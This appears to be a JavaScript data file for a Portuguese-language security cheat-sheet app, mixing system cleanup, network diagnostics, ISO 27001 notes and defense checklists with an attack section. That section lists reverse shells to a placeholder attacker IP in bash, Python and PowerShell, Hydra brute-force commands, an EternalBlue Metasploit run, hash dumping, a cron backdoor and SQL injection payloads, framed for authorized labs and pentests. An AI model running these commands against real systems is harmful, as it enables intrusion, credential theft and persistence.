    titulo: 'Script de limpeza – Linux',
    blocos: [
      { label: 'Limpeza de cache e temp', codigo: '#!/bin/bash\nsudo apt clean\nsudo apt autoclean\nsudo rm -rf /tmp/*\nsudo journalctl --vacuum-time=3d\n# Opcional: remover pacotes órfãos\n# sudo apt autoremove -y' },
      { label: 'Limpar memória cache (sem reiniciar)', codigo: 'sync; echo 3 | sudo tee /proc/sys/vm/drop_caches' },
    ],
  },

  // ========== REDE ==========
  {
    id: 'rede-diagnostico',
    categoriaId: 'rede',
    titulo: 'Comandos de rede – Diagnóstico e limpeza (básico ao avançado)',
    blocos: [
      { label: '1. Teste de conectividade (básico)', codigo: 'ping 8.8.8.8\nping google.com\n# Linux/Mac: ping -c 4 8.8.8.8\n# Testar porta específica (PowerShell): Test-NetConnection -ComputerName 8.8.8.8 -Port 443' },
      { label: '2. Rota e DNS', codigo: 'tracert google.com       # Windows: rota até destino\ntraceroute google.com   # Linux/Mac\nnslookup google.com     # consulta DNS (Windows/Linux)\ndig google.com          # DNS detalhado (Linux/Mac)' },
      { label: '3. Portas e conexões', codigo: 'netstat -an                    # Windows: todas as conexões\nnetstat -an | findstr LISTENING  # Windows: só em escuta\nss -tulpn                         # Linux: portas em escuta (TCP/UDP)\nnetstat -tulpn                     # Linux (alternativa)\nlsof -i :80                       # Linux: quem usa a porta 80' },
      { label: '4. Renovar IP (DHCP)', codigo: 'ipconfig /release    # Windows: liberar IP\nipconfig /renew      # Windows: obter novo IP\n# Linux: sudo dhclient -r; sudo dhclient\n# Linux (por interface): sudo dhclient -r eth0; sudo dhclient eth0' },
      { label: '5. Configuração de IP (básico)', codigo: 'ipconfig              # Windows: IP, máscara, gateway\nipconfig /all         # Windows: detalhes + DNS, DHCP\nip a                  # Linux: interfaces e IPs (ip addr show)\nifconfig              # Linux/Mac (legado)' },
      { label: '6. Limpeza de DNS e cache de rede', codigo: 'ipconfig /flushdns     # Windows: limpar cache DNS\nipconfig /registerdns  # Windows: reregistrar no DNS\n# Linux: sudo systemd-resolve --flush-caches  (systemd-resolved)\n# Mac: sudo dscacheutil -flushcache; sudo killall -HUP mDNSResponder' },
      { label: '7. Reset de rede (Windows – avançado)', codigo: 'netsh winsock reset    # Reset do Winsock\nnetsh int ip reset    # Reset da pilha TCP/IP\n# Reiniciar o PC após para aplicar completamente.' },
      { label: '8. Tabela de rotas (avançado)', codigo: 'route print              # Windows: ver rotas\nroute print -4          # Windows: só IPv4\nip route                # Linux: tabela de rotas\nip route show default  # Linux: rota padrão' },
      { label: '9. ARP – endereços MAC (avançado)', codigo: 'arp -a                  # Windows: tabela ARP (IP → MAC)\nip neigh                # Linux: vizinhos (equivalente ARP)\narp-scan -l            # Linux (Kali): escanear hosts na LAN' },
      { label: '10. Firewall (Windows – rápido)', codigo: 'netsh advfirewall show allprofiles\nnetsh advfirewall set allprofiles state off   # Desligar (cuidado)\nnetsh advfirewall set allprofiles state on    # Ligar' },
      { label: '11. Firewall (Linux – rápido)', codigo: 'sudo ufw status           # UFW: status\nsudo ufw enable          # Ativar UFW\nsudo iptables -L -n     # Listar regras iptables' },
      { label: '12. Teste de conectividade avançado', codigo: '# Linux: curl e wget para testar HTTP/HTTPS\ncurl -I https://google.com\nwget --spider https://google.com\n# Testar porta manual: nc -zv 8.8.8.8 443   # Linux/Mac\n# PowerShell: Test-NetConnection -ComputerName host -Port 443' },
    ],
  },

  // ========== ESTRATÉGIA ATAQUES (ELITE) ==========
  {
    id: 'estrategia-fases',
    categoriaId: 'ataques',
    titulo: 'Estratégia de ataque – Fases (modo elite)',
    blocos: [
      { label: '1. Reconhecimento (Recon)', codigo: 'OSINT: domínios, subdomínios, IPs, tecnologias, pessoas.\nFerramentas: theHarvester, Shodan, Google dorks, whois, DNS.\nObjetivo: mapear superfície de ataque sem tocar no alvo.' },
      { label: '2. Varredura (Scanning)', codigo: 'Portas abertas: nmap -sV -sC -p-.\nServiços e versões. Scripts: nmap --script vuln, default.\nObjetivo: lista de vetores (porta + serviço + versão).' },
      { label: '3. Obtenção de acesso (Gaining Access)', codigo: 'Exploração de vulnerabilidade (exploit, credencial, config).\nPriorizar: críticas e de fácil exploração.\nObjetivo: acesso inicial (shell, usuário).' },
      { label: '4. Manutenção (Maintaining Access)', codigo: 'Persistência: backdoor, tarefa agendada, serviço.\nEvitar detecção: ofuscação, limpeza de logs (em pentest autorizado, documentar).' },
      { label: '5. Pós-exploração e movimento lateral', codigo: 'Enumeração: usuários, grupos, privilégios, rede interna.\nEscalação: de usuário a admin/sistema.\nMovimento lateral: outros hosts na rede.' },
      { label: '6. Cobertura de rastros (Covering Tracks)', codigo: 'Em pentest: documentar; não destruir evidências sem combinar.\nEm cenário real (criminoso): limpar logs – ilegal. Profissional não cobre rastros de forma maliciosa; entrega relatório.' },
    ],
  },
  {
    id: 'estrategia-checklist',
    categoriaId: 'ataques',
    titulo: 'Checklist elite – Antes e durante o ataque',
    blocos: [
      { label: 'Antes do engajamento', codigo: '[] Escopo por escrito (IPs, domínios, tipos de teste).\n[] Autorização formal (contrato/termo).\n[] Regras de engajamento (horário, tipos de exploit, contato em caso de impacto).\n[] Ambiente de teste/backup se aplicável.\n[] Ferramentas e wordlists atualizadas.' },
      { label: 'Durante o teste', codigo: '[] Documentar cada achado (comando, evidência, screenshot).\n[] Não exceder escopo.\n[] Em caso de impacto (queda de serviço): parar e avisar.\n[] Priorizar: crítico > alto > médio > baixo.\n[] Coletar IOCs (IPs, hashes, URLs) para o relatório.' },
      { label: 'Após o teste', codigo: '[] Remover backdoors e artefatos deixados (conforme combinado).\n[] Relatório: executivo + técnico; vulnerabilidades com severidade e recomendações.\n[] Apresentação e entrega formal.' },
    ],
  },
  {
    id: 'estrategia-comandos-rapidos',
    categoriaId: 'ataques',
    titulo: 'Comandos rápidos – Pentest (referência)',
    blocos: [
      { label: 'Recon rápido', codigo: 'nmap -sV -sC -p 21,22,80,443,3389,8080 <IP>\nnmap -sn <rede>/24' },
      { label: 'Web', codigo: 'nikto -h http://<IP>\ngobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt' },
      { label: 'Hash (crack)', codigo: 'hashcat -m 1000 hash.txt wordlist.txt\njohn hash.txt --wordlist=wordlist.txt' },
      { label: 'Shell reverso (exemplo)', codigo: '# Atacante: nc -lvnp 4444\n# Alvo (ex.): bash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1' },
    ],
  },
  {
    id: 'estrategia-ataque-tipos',
    categoriaId: 'ataques',
    titulo: 'Estratégia de ataque – Tipos e vetores',
    blocos: [
      { label: 'Ataque por credenciais', codigo: 'Phishing → roubo de senha/MFA.\nForça bruta / credential stuffing em login, RDP, SSH.\nPass-the-Hash, Pass-the-Ticket (Windows).\nObjetivo: conta válida para acesso inicial ou movimento lateral.' },
      { label: 'Ataque por vulnerabilidade', codigo: 'Exploração de CVE em serviço exposto (web, RDP, SMB).\nSQL Injection, XSS, RCE em aplicações.\nObjetivo: execução de código ou acesso a dados sem credencial.' },
      { label: 'Ataque por engenharia social', codigo: 'Phishing (e-mail, SMS, chamada).\nPretexting, baiting, quid pro quo.\nObjetivo: que o usuário execute ação (clique, abra anexo, revele senha).' },
      { label: 'Malware e ransomware', codigo: 'Dropper → download/execução de payload.\nPersistência: registro, agendador, serviço.\nRansomware: criptografia + resgate; exfiltração antes (double extortion).\nObjetivo: controle do host, extorsão ou roubo de dados.' },
      { label: 'Movimento lateral e privilégio', codigo: 'Enumeração: usuários, grupos, shares, GPO.\nEscalação: exploit local, credencial de admin em cache.\nLateral: RDP, SSH, WMI, PsExec para outros hosts.\nObjetivo: dominar a rede e chegar a dados críticos.' },
      { label: 'Exfiltração e impacto', codigo: 'Exfiltração: upload para C2, cloud, e-mail.\nDestruição: wiper, apagar backups.\nDDoS ou desligar sistemas para impacto operacional.' },
    ],
  },

  // ========== ONDE FAZER + PASSO A PASSO ==========
  {
    id: 'ataque-onde-fazer',
    categoriaId: 'ataques',
    titulo: 'Onde fazer esses ataques – Ambiente autorizado',
    blocos: [
      { label: 'Regra de ouro', codigo: 'Só ataque em ambiente que você tem AUTORIZAÇÃO por escrito (contrato, termo). Atacar rede/sistema sem autorização é crime (Art. 154-A do Código Penal).' },
      { label: 'Opção 1 – Laboratório em casa (VM)', codigo: 'Onde: sua máquina.\nComo: VirtualBox/VMware. Uma VM com Kali Linux (atacante) e uma ou mais VMs alvo (ex.: Metasploitable, DVWA, Windows 7/10 vulnerável).\nDownload: Metasploitable2, DVWA, VulnHub (máquinas prontas para pentest).\nRede: modo "Rede interna" ou "Host-only" para as VMs se falarem.' },
      { label: 'Opção 2 – Plataformas de treino', codigo: 'HackTheBox (HTB): lab online, máquinas vulneráveis, VPN para acessar. Pago (premium) ou free.\nTryHackMe: trilhas guiadas + labs. Bom para passo a passo.\nVulnHub: imagens de VMs para baixar e rodar local.\nPentesterLab, Offensive Security (PWK/OSCP lab): mais avançado.' },
      { label: 'Opção 3 – Pentest real', codigo: 'Onde: rede/sistemas do cliente.\nComo: contrato com escopo (IPs, domínios, tipos de teste), regras de engajamento, janela de teste. Relatório ao final.\nNunca teste em produção sem autorização formal.' },
    ],
  },
  {
    id: 'ataque-passo-a-passo',
    categoriaId: 'ataques',
    titulo: 'Passo a passo do ataque – Onde executar cada etapa',
    blocos: [
      { label: 'Passo 0 – Preparar ambiente', codigo: 'Onde: sua máquina / VM Kali.\nO que fazer: Abrir terminal no Kali. Anotar seu IP (atacante): ip a. Anotar IP do alvo (ex.: 192.168.56.101). Ter wordlist: /usr/share/wordlists/rockyou.txt (ou similar).\nComando: ip a | grep "inet "' },
      { label: 'Passo 1 – Reconhecimento (Recon)', codigo: 'Onde: Kali (terminal).\nAlvo: IP ou domínio do alvo (só em lab/autorizado).\nComandos:\n  whois dominio.com\n  dig dominio.com\n  theHarvester -d dominio.com -b bing\nObjetivo: listar IPs, subdomínios, e-mails. Sem tocar no servidor ainda.' },
      { label: 'Passo 2 – Varredura de rede (Scan)', codigo: 'Onde: Kali.\nAlvo: IP do alvo (ex.: 192.168.56.101).\nComandos:\n  nmap -sn 192.168.56.0/24\n  nmap -sV -sC -p- 192.168.56.101\n  nmap --script vuln 192.168.56.101\nObjetivo: portas abertas, serviços, versões, possíveis vulnerabilidades.' },
      { label: 'Passo 3 – Varredura de aplicação (se tiver Web)', codigo: 'Onde: Kali.\nAlvo: http://192.168.56.101 ou http://192.168.56.101:8080.\nComandos:\n  nikto -h http://192.168.56.101\n  gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -t 50\n  ffuf -u http://192.168.56.101/FUZZ -w /usr/share/wordlists/dirb/common.txt\nObjetivo: diretórios ocultos, arquivos, erros que revelem tecnologia.' },
      { label: 'Passo 4 – Obter acesso (Exploit)', codigo: 'Onde: Kali (e às vezes no navegador para web).\nAlvo: serviço vulnerável (ex.: SSH na 22, HTTP na 80, SMB na 445).\nExemplos:\n  • Força bruta SSH: hydra -l root -P rockyou.txt ssh://192.168.56.101\n  • Metasploit: msfconsole → search exploit → use → set RHOSTS → run\n  • Web (SQLi/XSS): usar Burp Suite ou manual no navegador; payload em campo de login ou URL.\nObjetivo: shell (comando no alvo) ou acesso a painel/dados.' },
      { label: 'Passo 5 – Pós-exploração (no alvo)', codigo: 'Onde: DENTRO do alvo (shell que você obteve).\nSe for Linux: whoami, id, cat /etc/passwd, sudo -l, uname -a.\nSe for Windows: whoami, whoami /priv, systeminfo, net user, net localgroup administrators.\nObjetivo: entender usuário atual, privilégios, e como escalar para admin.' },
      { label: 'Passo 6 – Escalação e persistência (se combinado)', codigo: 'Onde: no alvo (shell) e em Kali (para receber shell reverso).\nExemplo persistência Linux: echo "*/1 * * * * /tmp/backdoor.sh" | crontab -\nExemplo Windows: criar tarefa agendada ou serviço.\nEm pentest autorizado: documentar; ao final remover backdoors.' },
    ],
  },
  {
    id: 'ataque-prompts-rede',
    categoriaId: 'ataques',
    titulo: 'Prompts de ataque – Rede e varredura (Kali)',
    blocos: [
      { label: 'Descoberta de hosts na rede', codigo: '# Onde: Kali. Substitua 192.168.56.0/24 pela rede alvo.\nnmap -sn 192.168.56.0/24\n# Lista hosts que respondem. Anote os IPs ativos.' },
      { label: 'Varredura completa de um host', codigo: '# Onde: Kali. Substitua TARGET_IP pelo IP do alvo.\nnmap -sV -sC -p- -T4 TARGET_IP -oN scan.txt\n# -sV: versões; -sC: scripts default; -p-: todas as portas; -oN: salvar resultado.' },
      { label: 'Scripts de vulnerabilidade (nmap)', codigo: 'nmap --script vuln TARGET_IP\nnmap --script exploit TARGET_IP\n# Roda scripts que checam vulnerabilidades conhecidas.' },
      { label: 'Varredura UDP (portas comuns)', codigo: 'nmap -sU --top-ports 100 TARGET_IP\n# UDP é mais lento; use em janela de teste se autorizado.' },
    ],
  },
  {
    id: 'ataque-prompts-web',
    categoriaId: 'ataques',
    titulo: 'Prompts de ataque – Web (Kali + navegador)',
    blocos: [
      { label: 'Descoberta de diretórios', codigo: '# Onde: Kali.\ngobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt,html\n# -x: extensões a tentar. Ajuste URL e wordlist.' },
      { label: 'SQL Injection (teste manual)', codigo: 'Onde: navegador ou Burp. Em campo de login ou URL com parâmetro.\nTeste em: http://TARGET_IP/page?id=1\nTentar: id=1\'  ;  id=1 OR 1=1  ;  id=1 UNION SELECT 1,2,3--\nSe der erro de SQL ou mudar resultado = possível SQLi. Use sqlmap para explorar:\n  sqlmap -u "http://TARGET_IP/page?id=1" --dbs' },
      { label: 'Nikto (scan rápido de vulnerabilidades web)', codigo: 'nikto -h http://TARGET_IP\nnikto -h http://TARGET_IP -p 8080' },
      { label: 'Burp Suite (interceptar e reenviar)', codigo: 'Onde: Kali. Abrir Burp Suite. Navegador com proxy 127.0.0.1:8080.\nInterceptar requisição → modificar parâmetros (ex.: cookie, id) → Forward.\nÚtil para SQLi, XSS, bypass de login.' },
    ],
  },
  {
    id: 'ataque-prompts-credenciais',
    categoriaId: 'ataques',
    titulo: 'Prompts de ataque – Quebra de credenciais (Kali)',
    blocos: [
      { label: 'Hydra – SSH', codigo: '# Onde: Kali. Alvo: serviço SSH no TARGET_IP.\nhydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP\n# Um usuário: -l user. Lista de usuários: -L users.txt -P pass.txt' },
      { label: 'Hydra – RDP (Windows)', codigo: 'hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://TARGET_IP' },
      { label: 'Hydra – HTTP (login de formulário)', codigo: 'hydra -l admin -P rockyou.txt TARGET_IP http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"' },
      { label: 'Crack de hash – John', codigo: '# Onde: Kali. Arquivo hash.txt com um hash por linha.\njohn hash.txt\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n# Formato: john identifica muitos; para NTLM use --format=nt' },
      { label: 'Crack de hash – Hashcat (NTLM)', codigo: 'hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt\n# -m 1000 = NTLM. Hash no formato LM:NTLM ou só NTLM.' },
    ],
  },
  {
    id: 'ataque-prompts-metasploit',
    categoriaId: 'ataques',
    titulo: 'Prompts de ataque – Metasploit passo a passo (Kali)',
    blocos: [
      { label: 'Iniciar e buscar exploit', codigo: '# Onde: Kali.\nmsfconsole\nsearch eternalblue\n# ou: search tipo_serviço (ex.: smb, apache)\nuse exploit/windows/smb/ms17_010_eternalblue' },
      { label: 'Configurar e explorar', codigo: 'set RHOSTS 192.168.56.101\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.56.102\n# LHOST = IP da sua Kali (quem recebe a conexão reversa).\nrun\n# Se der certo, você cai em uma sessão meterpreter no alvo.' },
      { label: 'Meterpreter – comandos úteis (no alvo)', codigo: 'shell          # abrir shell do Windows\nsysinfo        # info do sistema\ngetuid         # usuário atual\nhashdump       # hashes de senha (para crack ou Pass-the-Hash)\nrun post/windows/gather/enum_users   # enum usuários' },
      { label: 'Exploit genérico (ex.: handler para shell reverso)', codigo: 'use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST SEU_IP\nset LPORT 4444\nrun\n# Depois, no alvo você executa um payload que conecta de volta nessa porta.' },
    ],
  },
  {
    id: 'ataque-prompts-shell',
    categoriaId: 'ataques',
    titulo: 'Prompts de ataque – Shell reverso (onde rodar)',
    blocos: [
      { label: 'Atacante (Kali) – escutar conexão', codigo: '# Onde: Kali. Abrir primeiro.\nnc -lvnp 4444\n# ou: msfconsole → use multi/handler → set PAYLOAD ... → set LPORT 4444 → run' },
      { label: 'Alvo Linux – bash reverso', codigo: '# Onde: DENTRO do alvo (após RCE ou acesso). Troque ATACANTE_IP e 4444.\nbash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1' },
      { label: 'Alvo Linux – Python', codigo: 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATACANTE_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'' },
      { label: 'Alvo Windows – PowerShell', codigo: '# No alvo (PowerShell). Troque ATACANTE_IP e 4444.\npowershell -nop -c "$c=new-object net.sockets.tcpclient(\'ATACANTE_IP\',4444);$s=$c.getstream();[byte[]]$b=0..65535|%{0};while(($i=$s.read($b,0,$b.length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1);$r2=$r+\'PS \'+pwd+\'> \';$s2=[text.encoding]::ASCII.GetBytes($r2);$s.write($s2,0,$s2.length)}"' },
    ],
  },
  {
    id: 'ataque-prompts-pos',
    categoriaId: 'ataques',
    titulo: 'Prompts de ataque – Pós-exploração (dentro do alvo)',
    blocos: [
      { label: 'Linux – enumeração', codigo: '# Onde: shell no alvo Linux.\nwhoami && id\nuname -a\ncat /etc/passwd\ncat /etc/shadow   # se tiver permissão\nsudo -l         # o que pode rodar como root?\nfind / -perm -4000 2>/dev/null   # SUID\nnetstat -tulpn  # portas e processos' },
      { label: 'Windows – enumeração', codigo: '# Onde: shell (cmd ou PowerShell) no alvo Windows.\nwhoami\nwhoami /priv\nsysteminfo\nnet user\nnet localgroup administrators\nipconfig\nnetstat -an\n# Buscar senhas em texto: dir /s /b *.txt (cuidado em produção)' },
      { label: 'Linux – escalar para root (ex.: exploit SUID)', codigo: '# Se encontrar binário SUID (ex.: find / -perm -4000).\n# Pesquisar no searchsploit: searchsploit nome_binario\n# Ou: LinPEAS, LinEnum (scripts de enumeração automática).' },
      { label: 'Windows – dump de hashes (após admin)', codigo: '# No Kali (Meterpreter): hashdump\n# Ou no alvo com mimikatz (autorizado). Hashes NTLM para Pass-the-Hash ou crack offline.' },
    ],
  },

  // ========== CONFORMIDADE / ISO 27001 ==========
  {
    id: 'iso27001-atalho',
    categoriaId: 'conformidade',
    titulo: 'ISO 27001 – Referência rápida (atalho)',
    blocos: [
      { label: 'O que é a ISO 27001', codigo: 'Norma internacional para Sistema de Gestão de Segurança da Informação (SGSI). Foco: confidencialidade, integridade e disponibilidade da informação. Certificação por organismo acreditado; ciclo PDCA (Plan-Do-Check-Act).' },
      { label: 'Estrutura de alto nível (cláusulas 4–10)', codigo: '4 Contexto da organização (partes interessadas, escopo)\n5 Liderança (política, papéis, responsabilidades)\n6 Planejamento (riscos, objetivos)\n7 Suporte (recursos, competência, conscientização, comunicação, documentação)\n8 Operação (controles do Anexo A, gestão de mudanças)\n9 Avaliação de desempenho (monitoramento, auditoria interna, análise crítica)\n10 Melhoria (não conformidades, melhoria contínua)' },
      { label: 'Anexo A – Controles (resumo por domínio)', codigo: 'A.5 Organizacional (políticas, segregação de funções, gestão de ativos, controle de acesso)\nA.6 Pessoas (vetting, conscientização, disciplina)\nA.7 Físico (segurança em escritório, equipamentos, cabos)\nA.8 Tecnológico (controle de acesso lógico, criptografia, segurança em operações, comunicações, aquisição/desenvolvimento de sistemas)' },
      { label: 'Controles essenciais – checklist rápido', codigo: '[] Política de segurança da informação aprovada e comunicada\n[] Análise de riscos documentada e tratada\n[] Controle de acesso (identificação, autenticação, autorização, MFA para críticos)\n[] Criptografia para dados sensíveis em repouso e em trânsito\n[] Backup e teste de restauração\n[] Gestão de vulnerabilidades e patch\n[] Resposta a incidentes (plano, contatos, procedimentos)\n[] Auditoria interna e análise crítica pela direção' },
      { label: 'LGPD x ISO 27001', codigo: 'LGPD: lei brasileira; foco em dados pessoais; bases legais, direitos do titular, ANPD.\nISO 27001: norma voluntária; foco em SGSI amplo (qualquer informação).\nQuem está em conformidade com ISO 27001 tem boa base para LGPD (controles de segurança, governança); mas precisa mapear dados pessoais, bases legais e direitos do titular separadamente.' },
      { label: 'GDPR (Europa) – paralelo', codigo: 'Regulamento europeu; aplica-se a dados de residentes na UE. Princípios: licitude, finalidade, minimização, exatidão, limitação de conservação, integridade/confidencialidade, prestação de contas. Direitos: acesso, retificação, apagamento, portabilidade, oposição. Multas até 4% do faturamento global. DPO obrigatório em certos casos.' },
    ],
  },

  // ========== ESTRATÉGIA DEFESA (ELITE) ==========
  {
    id: 'defesa-prevencao',
    categoriaId: 'defesa',
    titulo: 'Estratégia de defesa – Prevenção',
    blocos: [
      { label: 'Hardening (endurecimento)', codigo: 'Desativar serviços e portas desnecessários.\nRemover software não usado.\nConfigurar firewall do SO (só o essencial aberto).\nPolítica de senha forte e MFA em todos os acessos críticos.' },
      { label: 'Atualização e patch', codigo: 'Manter SO e aplicações atualizados (patch de segurança).\nPriorizar vulnerabilidades críticas e exploradas (CISA KEV, etc.).\nTestar patch em homologação antes de produção.\nCiclo de atualização definido (ex.: mensal para críticos).' },
      { label: 'Privilégio mínimo', codigo: 'Usuário comum no dia a dia; admin só quando necessário.\nContas de serviço com menor privilégio possível.\nSem compartilhamento de contas; revogação ao sair da função.' },
      { label: 'Segmentação de rede', codigo: 'VLANs por função (admin, TI, usuários, visitantes, IoT).\nFirewall entre segmentos; tráfego só onde for necessário.\nReduz blast radius: comprometimento em um segmento não alcança todos.' },
      { label: 'Conscientização', codigo: 'Treinamento anti-phishing e uso seguro (links, anexos, senhas).\nSimulação de phishing para medir e melhorar.\nPolítica de uso aceitável e de classificação de dados.' },
    ],
  },
  {
    id: 'defesa-detecao',
    categoriaId: 'defesa',
    titulo: 'Estratégia de defesa – Detecção',
    blocos: [
      { label: 'Logs centralizados', codigo: 'Coletar logs de: firewall, proxy, SO, aplicações, AD, EDR.\nRetenção definida (ex.: 90 dias mínimo para investigação).\nProteção e integridade dos logs (acesso restrito, WORM se aplicável).' },
      { label: 'SIEM e correlação', codigo: 'SIEM: normalização, correlação de eventos, regras de detecção.\nAlertas para: múltiplas falhas de login, acesso anômalo, horário incomum, mudança de permissão.\nTuning para reduzir falso positivo e manter sensibilidade.' },
      { label: 'EDR e endpoint', codigo: 'EDR: visibilidade de processos, rede e arquivos no endpoint.\nDetecção de comportamento malicioso (injeção, persistência, C2).\nResposta remota: isolar host, coletar artefato, matar processo.' },
      { label: 'Monitoramento de rede', codigo: 'Tráfego suspeito: conexões para IPs maliciosos, DNS anômalo, exfiltração.\nIDS/IPS: assinaturas e anomalia.\nNetFlow/PCAP para análise forense pós-incidente.' },
      { label: 'Indicadores de comprometimento (IOC)', codigo: 'Hashes de malware, IPs/domínios de C2, padrões de registro ou arquivo.\nIntegrar IOCs em EDR, firewall, SIEM.\nAtualizar com threat intelligence (feeds, relatórios).' },
    ],
  },
  {
    id: 'defesa-resposta',
    categoriaId: 'defesa',
    titulo: 'Estratégia de defesa – Resposta a incidentes',
    blocos: [
      { label: 'Identificação', codigo: 'Reconhecer que um incidente está ocorrendo (alerta, usuário, anomalia).\nTriagem: severidade, escopo inicial, tipo (malware, phishing, invasão).\nAcionar equipe de resposta e iniciar documentação (linha do tempo).' },
      { label: 'Contenção', codigo: 'Impedir que o incidente se amplie.\nCurto prazo: isolar host (desconectar rede), desabilitar conta comprometida, bloquear IP/URL em firewall/proxy.\nLongo prazo: segmentar rede, trocar credenciais em escopo afetado.' },
      { label: 'Erradicação', codigo: 'Remover a causa: malware removido, vulnerabilidade corrigida (patch ou workaround).\nTrocar todas as senhas que possam ter sido expostas.\nRemover backdoors e contas criadas pelo atacante.' },
      { label: 'Recuperação', codigo: 'Restaurar sistemas a partir de backup limpo (validar integridade).\nRecolocar hosts na rede de forma controlada.\nMonitorar para garantir que a ameaça não retorne.' },
      { label: 'Lições aprendidas', codigo: 'Reunião pós-incidente: o que aconteceu, o que funcionou, o que falhou.\nAtualizar playbooks, regras de detecção e controles.\nComunicar à liderança e, se aplicável, à ANPD/afetados (LGPD).' },
    ],
  },
  {
    id: 'defesa-arquitetura',
    categoriaId: 'defesa',
    titulo: 'Estratégia de defesa – Arquitetura e modelo',
    blocos: [
      { label: 'Defesa em profundidade', codigo: 'Múltiplas camadas: perímetro (firewall), rede (segmentação, IDS/IPS), endpoint (EDR, antimalware), dados (criptografia, DLP), aplicação (WAF, código seguro).\nNenhuma camada sozinha é suficiente; uma falha não significa perda total.' },
      { label: 'Zero Trust (conceito)', codigo: 'Nunca confiar, sempre verificar.\nVerificar identidade e contexto (dispositivo, rede, comportamento) em cada acesso.\nAcesso mínimo por sessão; microsegmentação.\nAssume que a rede interna pode estar comprometida.' },
      { label: 'Ciclo de segurança (NIST)', codigo: 'Identify → Protect → Detect → Respond → Recover.\nIdentify: ativos, riscos, governança.\nProtect: controles preventivos.\nDetect: monitoramento e alertas.\nRespond: plano de resposta, comunicação.\nRecover: restauração e melhoria contínua.' },
    ],
  },
  {
    id: 'defesa-checklist',
    categoriaId: 'defesa',
    titulo: 'Checklist de defesa – Controles essenciais',
    blocos: [
      { label: 'Prevenção', codigo: '[] MFA em todos os acessos críticos (e-mail, VPN, admin).\n[] Patch de segurança em prazo definido (ex.: crítico em 7 dias).\n[] Política de senha (complexidade, não reutilização).\n[] Segmentação de rede (pelo menos admin separado).\n[] Backup automatizado e teste de restauração.' },
      { label: 'Detecção', codigo: '[] Logs de autenticação e acesso centralizados.\n[] Antimalware/EDR em todos os endpoints e servidores.\n[] Monitoramento de rede (firewall/proxy com log; IDS se possível).\n[] Alertas para falha de login em massa e acesso em horário anômalo.' },
      { label: 'Resposta', codigo: '[] Plano de resposta a incidentes documentado.\n[] Contatos (equipe interna, jurídico, comunicação).\n[] Procedimentos de contenção (isolar host, bloquear conta).\n[] Possibilidade de restauração a partir de backup.' },
    ],
  },
];

export function getAtalhosPorCategoria(categoriaId) {
  return atalhos.filter((a) => a.categoriaId === categoriaId);
}

export function getCategoriaAtalho(id) {
  return categoriasAtalhos.find((c) => c.id === id);
}
